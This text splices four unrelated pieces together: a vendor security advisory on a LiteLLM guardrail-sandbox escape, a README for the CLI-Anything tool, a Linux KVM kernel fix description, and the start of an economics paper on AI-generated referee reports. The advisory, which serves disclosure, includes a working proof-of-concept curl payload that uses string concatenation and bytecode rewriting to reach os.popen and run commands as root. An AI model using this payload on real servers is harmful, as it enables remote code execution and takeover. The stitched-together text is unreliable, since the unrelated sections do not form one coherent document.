 Confirmed Affected Versions: main-latest (docker image ghcr.io/berriai/litellm:main-latest , repo digest ghcr.io/berriai/litellm@sha256:bb0639701796218a3447160e55c0f1097446e4e6085df7dfd39f476d4143743f) 

 Confirmed Patched Versions: TBD 

 Vendor: BerriAI 

 Vendor URL: https://github.com/BerriAI/litellm 

 Vendor Reference: TBD 

 Vector: Authenticated HTTP API request 

 Credit: X41 D-Sec GmbH, Markus Vervier 

 Status: Public 

 CVE: TBD 

 CWE: CWE-94 (Improper Control of Generation of Code / Code Injection) 

 CVSS Score: 8.7 

 CVSS Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N 

 Advisory URL: https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm/ 

 Summary and Impact 
 The LiteLLM proxy exposes a /guardrails/test_custom_code API endpoint that allows authenticated users to submit arbitrary Python code for guardrail testing. The endpoint attempts to restrict dangerous operations using regex-based source code filtering, but this can be bypassed using bytecode rewriting techniques to achieve arbitrary code execution on the server. 

 An authenticated attacker can exploit this vulnerability to execute arbitrary commands as the user the LiteLLM process runs as (root in the default Docker image). 

 Product Description 
 LiteLLM is an open-source LLM proxy that provides a unified OpenAI-compatible API for over 100 LLM providers. It supports features such as load balancing, cost tracking, rate limiting, and guardrails for input/output filtering. The guardrails feature allows administrators to define custom Python code that is executed to filter or transform LLM requests and responses. 

 Analysis 
 The /guardrails/test_custom_code endpoint accepts a JSON body containing a custom_code field with Python source code and a test_input field. The server executes the provided Python function in a restricted environment that uses regex-based filtering to block access to dangerous attributes and built-in functions. However, this filtering operates only on the source code level and can be bypassed through a combination of string concatenation and CPython bytecode manipulation techniques. 

 The bypass works in 6 steps: 

 Step 1 — Regex bypass via string concatenation: Blocked attribute names such as __globals__ , __builtins__ , and __import__ are constructed at runtime using string concatenation (e.g. "_"+"_gl"+"ob"+"als"+"_"+"_" ). Since the regex filter matches literal strings in the source code, the concatenated form is not detected. 

 Step 2 — Obtain the object class: The object base class is obtained via str.mro()[1] instead of using __class__ , which is blocked by the filter. 

 Step 3 — Access generator code object: A generator function is defined and its code object is accessed via the gi_code attribute, which is not blocked. The code.replace(co_names=...) method is then used to rewrite the bytecode’s name table, changing which attributes the bytecode will access at runtime. 

 Step 4 — Swap function code: object.__setattr__() is used to replace the generator function’s __code__ attribute with the rewritten code object. The __code__ attribute name is constructed dynamically to avoid the regex filter. 

 Step 5 — Extract real builtins: The modified generator function is called with http_get (a function available in the sandbox environment) as argument. The rewritten bytecode accesses http_get.__globals__["__builtins__"]["__import__"] , extracting the real __import__ function from the unrestricted builtins. 

 Step 6 — Achieve RCE: With access to __import__ , the attacker imports os and executes arbitrary commands: __import__("os").popen("id").read() returns uid=0(root) in the default Docker deployment. 

 Proof of Concept 

 The following sets up a vulnerable test environment: 

 docker run -d --name litellm -p 4000:4000 -e LITELLM_MASTER_KEY=sk-litellm-master-key ghcr.io/berriai/litellm:main-latest
 

 The following curl command triggers the sandbox escape and executes the id command on the server: 

 curl -s -X POST \
 -H "Authorization: Bearer sk-litellm-master-key" \
 -H "Content-Type: application/json" \
 http://localhost:4000/guardrails/test_custom_code \
 -d '{
 "custom_code": "def apply_guardrail(inputs, request_data, input_type):\n obj = str.mro()[1]\n def g(fn):\n yield fn.placeholder\n c = g(None).gi_code\n gn = \"_\"+\"_gl\"+\"ob\"+\"als\"+\"_\"+\"_\"\n cn = \"_\"+\"_co\"+\"de_\"+\"_\"\n obj.__setattr__(g, cn, c.replace(co_names=(gn,)))\n for v in g(http_get):\n gd = v\n break\n bn = \"_\"+\"_bu\"+\"ilt\"+\"ins\"+\"_\"+\"_\"\n imp = gd[bn][\"_\"+\"_im\"+\"po\"+\"rt_\"+\"_\"]\n return {\"rce\": imp(\"os\").popen(\"id\").read()}",
 "test_input": {"messages": [{"role": "user", "content": "test"}]}
 }'
 

 The server responds with the output of the id command, confirming code execution as root: 

 {"success":true,"result":{"rce":"uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n"},"error":null,"error_type":null}
 

 Workarounds 
 No vendor patch is available at the time of publication. Users could apply the following mitigations: 

 
 Block the endpoint at the reverse proxy level: If LiteLLM is deployed behind a reverse proxy such as nginx or Caddy, deny requests to /guardrails/test_custom_code . For example in nginx: location /guardrails/test_custom_code { deny all; return 403; } 
 Restrict access to the admin API: The affected endpoint requires authentication with the master key. Ensure the master key is only known to trusted administrators and is not shared with regular API consumers. 
 Do not expose the LiteLLM management interface to untrusted networks: Use network-level controls (firewall rules, VPC security groups) to limit access to the LiteLLM admin port to trusted hosts only. 
 Avoid running LiteLLM as root: The default Docker image runs the process as root, maximizing the impact of code execution. Use --user to run the container as an unprivileged user to limit post-exploitation impact. 
 

 Timeline 
 2026-02-13 Issue identified, PoC created 

 2026-02-18 LiteLLM acknowledged, giving an initial ETA for fix: by the end of next week 

 2026-03-20 Follow-up sent for patch status and disclosure coordination 

 2026-03-24 Urgent follow-up sent, delivery failure received for technical contact’s email

--- ## 🤔 Why CLI? CLI is the universal interface for both humans and AI agents: • **Structured & Composable** - Text commands match LLM format and chain for complex workflows • **Lightweight & Universal** - Minimal overhead, works across all systems without dependencies • **Self-Describing** - --help flags provide automatic documentation agents can discover • **Proven Success** - Claude Code runs thousands of real workflows through CLI daily • **Agent-First Design** - Structured JSON output eliminates parsing complexity • **Deterministic & Reliable** - Consistent results enable predictable agent behavior ## 🚀 Quick Start CLI-Anything has two equally useful starting points: | Goal | Start Here | |------|------------| | **Use the existing CLI ecosystem now** | Install `cli-anything-hub`, browse the registry, and install ready-made CLIs. | | **Build a new agent-native CLI** | Install the CLI-Anything plugin/skill for your agent, then run the 7-phase harness generator. |
Phase 1: Empower yourself — your CLI toolkit Install the CLI-Hub package manager first. It lets you browse, search, inspect, install, update, uninstall, and launch CLI-Anything harnesses plus public third-party CLIs from one command. **PIP** ```bash pip install cli-anything-hub ``` | Command | What it does | |---------|--------------| | `cli-hub list` | Browse the registry | | `cli-hub search ` | Search by keyword | | `cli-hub info ` | Inspect one CLI | | `cli-hub install ` | Install from CLI-Hub | | `cli-hub update ` | Update an install | | `cli-hub uninstall ` | Remove an install | | `cli-hub launch [args...]` | Run an installed CLI | ```bash # Browse what is available cli-hub list cli-hub search image # Install and try a CLI immediately cli-hub install gimp cli-hub info gimp cli-hub launch gimp ``` > Some CLIs wrap real desktop or backend software. If a selected CLI needs GIMP, Blender, LibreOffice, or another upstream tool, install that upstream application too.

It encodes proven patterns and methodologies refined through automated generation processes. The playbook distills key insights from successfully building all 18 diverse, production-ready harnesses. ### Critical Lessons | Lesson | Description | |--------|-------------| | **Use the real software** | The CLI MUST call the actual application for rendering. No Pillow replacements for GIMP, no custom renderers for Blender. Generate valid project files → invoke the real backend. | | **The Rendering Gap** | GUI apps apply effects at render time. If your CLI manipulates project files but uses a naive export tool, effects get silently dropped. Solution: native renderer → filter translation → render script. | | **Filter Translation** | When mapping effects between formats (MLT → ffmpeg), watch for duplicate filter merging, interleaved stream ordering, parameter space differences, and unmappable effects. | | **Timecode Precision** | Non-integer frame rates (29.97fps) cause cumulative rounding. Use `round()` not `int()`, integer arithmetic for display, and ±1 frame tolerance in tests. | | **Output Verification** | Never trust that export worked because it exited 0. Verify: magic bytes, ZIP/OOXML structure, pixel analysis, audio RMS levels, duration checks. | > See the full methodology: [`cli-anything-plugin/HARNESS.md`](cli-anything-plugin/HARNESS.md) --- ## 📦 Installation & Usage ### For CLI-Hub Users ```bash # Install the package manager pip install cli-anything-hub # Browse, search, inspect, and install CLIs cli-hub list cli-hub search cli-hub info cli-hub install # Manage installed CLIs cli-hub update cli-hub uninstall cli-hub launch [args...] ``` ### For Plugin Users (Claude Code) ```bash # Add marketplace & install (recommended) /plugin marketplace add HKUDS/CLI-Anything /plugin install cli-anything # Build a CLI for any software with a codebase /cli-anything ``` ### For Generated CLIs ```bash # Install any generated CLI cd /agent-harness pip install -e . # Verify which cli-anything- # Use cli-anything- --help cli-anything- # enters REPL cli-anything- --json # JSON output for agents ``` ### Running Tests ```bash # Run tests for a specific CLI cd /agent-harness python3 -m pytest cli_anything//tests/ -v # Force-installed mode (recommended for validation) CLI_ANYTHING_FORCE_INSTALLED=1 python3 -m pytest cli_anything//tests/ -v -s ``` --- ## 🤝 Contributing We welcome contributions! CLI-Anything is designed to be extensible: - **New software targets** — Use the plugin to generate a CLI for any software with a codebase, then submit your harness via [`cli-anything-plugin/PUBLISHING.md`](cli-anything-plugin/PUBLISHING.md). - **Methodology improvements** — PRs to `HARNESS.md` that encode new lessons learned - **Plugin enhancements** — New commands, phase improvements, better validation - **Test coverage** — More E2E scenarios, edge cases, workflow tests ### Limitations - **Requires strong foundation models** — CLI-Anything relies on frontier-class models (e.g., Claude Opus 4.6, Claude Sonnet 4.6, GPT-5.4) for reliable harness generation. Weaker or smaller models may produce incomplete or incorrect CLIs that require significant manual correction. - **Relies on available source code** — The 7-phase pipeline analyzes and generates from source code. When the target software only provides compiled binaries that require decompilation, harness quality and coverage will degrade substantially. - **May require iterative refinement** — A single `/cli-anything` run may not fully cover all capabilities. Running `/refine` one or more times is often needed to push the CLI's performance and coverage to production quality. ### Roadmap - [ ] Support for more application categories (CAD, DAW, IDE, EDA, scientific tools) - [ ] Benchmark suite for agent task completion rates - [ ] Community-contributed CLI harnesses for internal/custom software - [ ] Integration with additional agent frameworks beyond Claude Code - [ ] Support packaging APIs for closed-source software and web services into CLIs - [x] Produce SKILL.md alongside the CLI for agent skill discovery and orchestration --- ## 📖 Documentation | Document | Description | |----------|-------------| | [`cli-anything-plugin/HARNESS.md`](cli-anything-plugin/HARNESS.md) | The methodology SOP — single source of truth | | [`cli-anything-plugin/README.md`](cli-anything-plugin/README.md) | Plugin documentation — commands, options, phases | | [`cli-anything-plugin/QUICKSTART.md`](cli-anything-plugin/QUICKSTART.md) | 5-minute getting started guide | | [`cli-anything-plugin/PUBLISHING.md`](cli-anything-plugin/PUBLISHING.md) | Distribution and publishing guide | Each generated harness also includes: - `.md` — Architecture SOP specific to that application - `tests/TEST.md` — Test plan and results documentation --- ## ⭐ Star History If CLI-Anything helps make your software Agent-native, give us a star! ⭐

Title:  KVM: x86: Unconditionally reset MMU context when emulating INIT

#### Description

In the Linux kernel, the following vulnerability has been resolved: KVM: x86: Unconditionally reset MMU context when emulating INIT Force an MMU reset when emulating an INIT even if paging was already disabled, as the MMU page role includes guest_mode (L2), i.e. an INIT while L2 is running with CR0.PG=0 will result in KVM running L1 with a stale MMU context. Alternatively, the reset could be scoped strictly to paging being enabled or L2 being active, but SMM is also encoded in the page role. Even though it _should_ be impossible for the vCPU to be INIT'd while SMM is active, there's zero value in not handling SMM. At that point, the only scenario where KVM _doesn't_ need to reset the MMU context is on an INIT with the vCPU running in Real Mode or Unpaged Protect Mode, and while INIT in those modes is somewhat common, it's far from a hot path and re-initializing the MMU is not expensive, especially when the role isn't changing (KVM elides most of the re-configuration in that case). Note, like the Fixes commit, this bug only affects nested SVM as INIT is an unconditional intercept on VMX, i.e. it's impossible to emulate INIT while L2 is active. Temporarily keep the guest TLB flush when CR0.PG is being cleared even though it is fully redundant with the flush that is emitted on all INIT events (KVM itself only does RESET when a vCPU is being created, i.e. when CR0.PG must be '0').

Can Peer Review Survive
AI-Generated Text?∗
Dario Caldara

Jesús Fernández-Villaverde

Board of Governors of the Federal Reserve System

University of Pennsylvania, CEPR, NBER

November 16, 2026
Abstract
Large language models now write papers and referee reports in economics. The field
must develop best practices for handling AI-generated text in the publication process.
Otherwise, peer review is in serious danger of collapsing. We propose that AI detectors
should become a standard tool of the profession. Our experiment shows that they flag
referee reports written by AI, not reports that AI merely proofread or helped edit.
Aided by a simple model, we argue that a paper flagged as AI-generated should trigger a
closer reading and can be rejected at the first mistake, and that an AI-generated referee
report adds nothing that editors could not get by running the prompt themselves. Such
reports are unacceptable: they damage authors and journals and should be treated like
plagiarism. Individual restraint has already shown its limits, and the profession needs
to develop norms to solve this collective action problem. We close with a practical
guide for authors, referees, and editors.
JEL Classification: A14, D82, O33
Keywords: Large language models, AI detection, peer review, referee reports, moral
hazard, verification.

∗

Correspondence: dario.caldara@frb.gov and jesusfv@econ.upenn.edu. We thank Emine Boz, Kevin
Bryan, Jing Li, Justin Pierce, Evi Pappa, and Immo Schott for useful comments. We also thank Sofie Grouws
and Shayan Khan for outstanding research assistance. We used LLMs while preparing this paper, as we
describe in footnote 1. However, we are responsible for all remaining errors. We have no financial ties to, or
interest in, any of the companies cited. The views expressed in this paper are solely the responsibility of
the authors and should not be interpreted as reflecting the views of the Board of Governors of the Federal
Reserve System or of anyone else associated with the Federal Reserve System.

1

Introduction

The economics profession is seeing a rapid increase in the use of large language models (LLMs)
to assist research. LLMs can be extremely useful at various stages of a research project, and,
like most people, we use them routinely in our work. We write better papers thanks to them.1
The use of LLMs in academic writing and throughout the peer-review process is already
widespread, and anyone who has recently written, refereed, or edited a paper has seen it.2 We
contend that this fast increase in AI-generated content puts peer review in jeopardy: journals
will be flooded with low-quality submissions, economists will decline requests to referee papers
or routinely use AI to referee them, and which papers get published will become less and less
linked to their quality.
We do not want to defend the status quo entirely. Peer review is slow, many reports are
poor, and editors (including us!) make bad calls all the time. Still, well-executed peer review
remains the best system we have to assess each other’s work and advance the profession.3 AI
could improve peer review if used deliberately for that purpose, for instance, to check proofs
and code. That is not what we are seeing.
As editors, we have already encountered papers and referee reports that are 99 percent
AI-generated according to state-of-the-art detection software such as Pangram. As authors,
we have already received referee reports that were mostly AI-generated, even from the top
journals in the profession. And we cannot emphasize this enough: the real problem is not
that the papers and reports were AI-generated; it is that no one had done the thinking
behind them, and it showed. The papers were eminently forgettable, and the referee reports
were disappointingly uninsightful. We have seen too many reports of the form: “The paper
is well-written and addresses an important problem. However, the authors should consider
additional baselines.”4
Our starting point is a common distinction in the debate about AI: whether it complements
or substitutes for human effort. AI is a complement when it helps researchers think better
and faster: finding related work, wrangling data, writing and debugging code, or improving
1

We are happy to acknowledge that we used LLMs to help with this paper. For example, we used Claude
Opus 5.5 to check the strengths and weaknesses of our arguments, suggest ways to develop them further,
and improve grammatical flow. We used Refine.ink to evaluate a nearly final draft.
2
Gartenberg et al. (2026) run Pangram on submissions and referee reports at Organization Science:
submission volume in 2024–2025 was 42 percent higher than in 2022–2023, and the growth of AI-generated
writing accounts for nearly all of the increase. In a 2025 survey, more than half of about 1,600 researchers
reported using AI tools when reviewing manuscripts (Naddaf, 2025b).
3
More radical alternatives, such as abolishing peer review or having editors decide without referees, are
possible, but we have not seen serious proposals along these lines, so we do not discuss them here.
4
Views on AI in refereeing already differ widely, from enthusiasts arguing for the adoption of AI-based
peer review tools to skeptics who see AI-written reviews as the end of “the entire social contract of peer
review” (Naddaf, 2025a).

2

 the flow of a draft. And, for those of us whose first language is not English, AI helps us avoid
embarrassing grammatical mistakes or wasting an inordinate amount of time determining if
the right preposition is “in” or “on.” AI is a substitute when it does the thinking instead of
the researcher. Our view is that AI should be a complement, not a substitute.
The difficulty is that readers, including editors and referees, cannot see how AI was
used. Before AI, writing was costly, so a carefully written text was evidence (imperfect, but
informative) that someone had thought through the paper and checked its execution and
writing. AI removes the cost of writing and, with it, the signal. As a result, in practice, the
burden of verification shifts from the author to the reader.
Bad papers and referee reports existed long before AI. The problem is that, with AI,
there are many more of them. Even if we can identify the bad papers and reports one by one,
doing so takes time and resources away from good, thoughtful papers. On the surface, the
careful author who has spent weeks going over every result with utmost diligence and the
careless author who just submitted the output of an LLM look alike. Readers will recognize
this as a version of the market-for-lemons problem (Akerlof, 1970). If readers cannot easily
observe the quality of a text, good and bad papers (and referee reports) pool. Consequently,
good papers are discounted along with the bad: the innocent pay for the sins of the guilty.
To us, this is the clearest argument for AI detectors: they tell us where our time should
go. Without detectors, a reader must vet every text as if it could be AI-generated, which
takes more time. And detectors can be trusted in the direction that matters: a long text
flagged as AI-generated is almost certainly generated by AI. No one has an incentive to make
their own human-written text look AI-generated, so false positives come only from errors
of the detector, which are rare (Jabarian and Imas, 2025). At the same time, AI detectors
are not flawless: a text classified as human might still have been generated by AI, because
authors who want AI text to pass as human have both the incentive and the tools (see, for
example, undetectable.ai). We will come back to this point repeatedly.
The damage is much more serious when authors and editors receive AI-generated referee
reports. A report generated by AI looks like a careful one (particularly in its visual “look
and feel”), but it carries the judgment of the LLM, not the judgment of the referee. Authors
whose papers are rejected on the basis of such reports are rightly frustrated. Since authors can
run the reports they receive through an AI detector as easily as editors can, these rejections
also damage the reputation of the journal.
In our profession, we all play several roles at once: we are authors, referees, often editors,
and always readers of each other’s work. A referee who delegates a report to an LLM today
is likely to receive an AI-generated report as an author tomorrow. Each of us gains from
using AI to cut corners in the boring roles (e.g., refereeing) and loses when others do the
3

 same in the interesting ones (e.g., as authors who want a good evaluation of our research).
And that is why we need shared norms. Individual restraint has already proven insufficient.
Our goal is to preserve and improve the quality of peer review and the progress of
economics as a field. We would count it as a success if the arrival of AI pushed the profession
to raise the standards of peer review at every level, starting with how we train graduate
students to referee and how we design evaluation mechanisms. In the rest of this paper, we
discuss how the profession should respond, drawing on our experience as authors, referees,
and editors.
We try to answer four questions that every journal will soon have to settle. Are we
worried about the writing or about the verification of the analysis? About the quality of the
paper or about errors? Should a text flagged as AI-generated lead to closer scrutiny or to
disqualification? Should the answer differ for authors and referees? AI detectors play an
important role in what follows. But our core argument is about verification, judgment, and
incentives, not about AI detection.
We focus on text because text is what detectors read and what referees write. The use of
AI in the execution of the research (data, code, proofs) matters at least as much, but the
rule there is simpler: AI can do as much of the execution as the author wants, as long as the
author verifies the output.
We build our argument in three steps. First, we run an experiment with 25 real referee
reports published by Nature Communications (Section 2.2). We ask two LLMs to undertake
four exercises with each report: to proofread it, to edit it for language, to rewrite it, and
to write a new report from the published paper alone. Then, we score every version with
Pangram. The first two exercises, proofreading and language editing, leave the reports
classified as almost entirely human. By contrast, the reports written from the paper are
classified as almost entirely AI-generated. Every one of these AI-written reports recommends
major revision for a paper that was already published. Second, we argue that the burden of
verification must stay with authors (Section 3) and that AI-based peer review is unacceptable
(Section 4). Third, we write a simple model of peer review in which authors decide whether
to vet their analysis and whether to engage with the writing, and editors decide whether to
scrutinize a flagged paper (Section 5).
Takeaways and proposals. From these three steps, we draw takeaways and proposals,
which we see as the start of a conversation. Given the fast progress of LLMs, what seems
a reasonable position in the fall of 2026 might age badly in a few months.5 Each takeaway

• Journals. AI detectors should become a standard tool of the profession, and journals
should lead by using them to screen papers and referee reports. Journals should also
set out detailed AI-use policies. For example, a journal’s submission system could
automatically reject a referee report whose AI-generated share is above a small threshold,
such as 10 percent (or, when watermarks are available, one that contains AI watermarks).
We will face an arms race between generative AI and AI-content detectors, but at least
the cost of violating the rules should not be close to zero, as it is now.
AI use that improves papers and reviews should be encouraged and protected, but its
limits and the disclosure requirements should be made abundantly clear. Journals should
publish examples of acceptable use, like the two prompts that we tested (Section 2.2).
• Authors. AI can help write the text and execute the analysis, but, as always, the
author must stand behind every result in the paper. What changes is the enforcement: a
flag shifts to the author the burden of showing that the analysis was verified (Section 3).
• Editors. A paper flagged as AI-generated is not a crime, but it is a signal, because
authors who skip the writing tend also to skip checking their analysis (an assumption we
motivate in Section 5). The flag should trigger a closer reading, not a rejection: rejecting
every flagged paper would discard the sound papers of careful authors (Result 3). A
flagged paper can be rejected at the first substantive mistake found, because a visible
mistake in a flagged paper makes hidden errors more likely (Result 2). Sanctions should
follow errors, not the use of AI, and journals should commit publicly to this policy
(Result 4).
Unchecked errors are negligence rather than misconduct, but negligence has consequences: authors whose flagged papers contain material errors they did not check should
be banned from further submission, and the duration of the ban should depend on the
severity of the violation. The same ban could apply to any author shown not to have
checked the analysis: the flag only makes that negligence more likely. The asymmetry
with an honest mistake in an unflagged paper follows from the model: an error in a
flagged paper is much more likely to come from an author who did not vet (Result 2),
and a large penalty is what makes negligent authors vet when few flagged papers are
published (Result 3).
• Referees. A report written by AI adds absolutely nothing: the editor could have
5

 asked the same LLM for a report and saved two months of waiting (Sections 4 and 5).6
And if journals require submissions to include an AI peer review, there is no reason
whatsoever for the referee to repeat that review. Referees can use AI to assist their
review (if allowed by the journal), but AI should never replace their judgment. And, no,
even a careful reading of the referee report generated by the LLM is not “judgment.”
For referees, unlike authors, the AI-generated report is itself the violation. Referees
should commit not to generate AI-based reviews, and referees who submit reports
that violate the rules (including breaches of confidentiality) should be banned from
publishing in that journal (or, if the journal belongs to an organization like the American
Economic Association, in all the journals of the organization).
Finally, sticks should come with carrots. Refereeing is often unpaid and invisible.
Journals could reward timely and careful reports, for instance by having editors grade
reports, recognizing their best referees, or offering waivers of submission and publication
fees, and economics departments should count outstanding refereeing as service to the
profession.
• Social norms. Above all, the profession should develop strong social norms about
what is and is not acceptable behavior. We already have these rules, for example, for
plagiarism. While the rules have not completely eliminated plagiarism, they have, at
least, contained its damage to manageable levels. An AI-generated referee report should
carry the same stigma as plagiarism (Section 4). Plagiarism shows how to combine
social norms and tools. Most journals run submissions through software that performs
similarity checks. A match triggers a closer reading by the editor, not a rejection. AI
detectors can play the same role.

2

What a high AI score does and does not tell us

We take Pangram as the state of the art (Jabarian and Imas, 2025). Pangram classifies text as
human-written, AI-generated, or AI-assisted, scoring longer documents segment by segment.
Very short texts give AI detectors less to work with, but papers and most referee reports are
long enough to obtain a reliable signal. AI detectors concern the wording, not the content, a
distinction we develop in the model.
6

As editors, we have already received detailed referee reports a few hours after inviting the referee to
review the paper. What baffles us is that these referees do not even pretend to have read and thought about
the paper (in contrast, for example, to a one-paragraph report saying “I already refereed this paper for
another journal” or “after a cursory look, this paper does not make any sense,” which can be written quickly).

6

 2.1

False negatives vs. false positives

AI text detectors can make two kinds of errors. They can label AI-generated text as human,
a false negative, or they can label human text as AI-generated, a false positive. Pangram’s
error rates of both kinds are close to zero for medium and long passages (Jabarian and Imas,
2025).7 Nonetheless, the two errors differ in an important way.
• False negatives are actively sought. Authors who want AI-generated text to pass
as human have both the incentive and the tools (commercial “humanizer” software) to
do so. Pangram has so far been robust to such tools. But this is a classic arms race,
and evasion techniques will improve. A humanized text hides the signal but not the
damage.
In any case, a successful “humanization” of a text usually requires the author to engage
with the text, at least partially fulfilling the goal we seek.
• False positives are not. No one has an incentive to make their own human-written
text look AI-generated. We believe that low measured false-positive rates are likely to
persist even as AI detectors try to outsmart “humanizer” software.
Thus, the label is informative mainly in one direction: a paper classified as mostly human
is only weak evidence, while a paper classified as mostly or entirely AI-generated is strong
evidence that an AI produced the text. While we have encountered papers and referee reports
with heavy use of AI-generated text that Pangram classified as mostly human, we have not
encountered a single false positive.
We want to be clear: we are not concerned with texts that Pangram classifies as, say,
10 percent AI-generated. That share may simply reflect the use of technical or formulaic
expressions, reliance on LLMs to summarize a result or shorten a paragraph, or, paradoxically,
human writers unconsciously adopting the typical turns of phrase of LLMs after reading
many of them.
We are concerned with texts that Pangram classifies as, for instance, 40 percent AIgenerated or higher. The exact threshold depends on the context, and we are not going
to draw a tight line in the sand. Our experiment in Section 2.2 suggests a rule of thumb.
Language editing produced reports with about 1 percent AI-generated content, while rewriting
raised that share to about 53 percent. Hence, editors could ignore shares below 20 percent,
look more carefully at those between 20 and 50 percent, and give reports above 50 percent a
close reading.
7

More recently, Dhingra and Pruthi (2026) have shown that coding agents equipped with a base language
model can assemble responses that evade detection. We are less concerned about this possibility because it
requires many tokens. More importantly, this kind of evasion still produces no false positives.

 2.2

An experiment with real referee reports

Does a referee who uses AI in a legitimate way, that is, to proofread or polish a report, get
flagged by an AI detector? And does a referee report written by AI get caught?
To answer these two questions, we ran a simple experiment. We drew 25 first-round
referee reports at random from the Corpus of Transparent Peer Review (Akbas et al., 2023),
which collects referee reports that Nature Communications made public for papers in the
biological and physical sciences.8 The dataset includes all reports and authors’ replies, which
we matched to the published versions of the papers.
Our research assistants used Claude Sonnet 5.5 and ChatGPT 5.6 Terra, both set at the
highest level of effort, to execute four prompts. The first three prompts took as input the
original reports and instructed the LLM to edit the text at increasing intensity. Specifically:
Prompt 1: Proofreading only (e.g., spelling, grammar, punctuation).
Prompt 2: Language editing for clarity and flow but keeping every point intact.
Prompt 3: Rewriting the report in the LLM’s own words.
The fourth prompt took as input the published version of the paper:
Prompt 4: Write a new report from the paper alone, without the original report.
The first two prompts are clear examples of AI-assisted review, the fourth is an AI-based
review, and the third sits in between. We used a new LLM session for each prompt and
report. We then scored the text generated by each prompt with Pangram 4.1. Details of the
experiment and the prompts are in Appendix A, while examples of original and rewritten
text are in Appendix B.
Table 1 reports our findings. All 25 original reports were classified as 100 percent human,
including four reports shorter than 300 words. Proofreading left all 50 proofread versions
100 percent human. Language editing changed more than a quarter of the words, yet the
reports remained classified as nearly all human-written (5 reports have a small share of text
classified as AI-generated). Rewriting raised the AI-generated share in 49 of the 50 rewritten
versions. Reports written from the paper alone were nearly 100 percent AI-generated.
Strikingly, although prompt 4 did not ask for a recommendation, all 50 AI-generated
reports volunteered one. All of them recommended major revision. And these are the
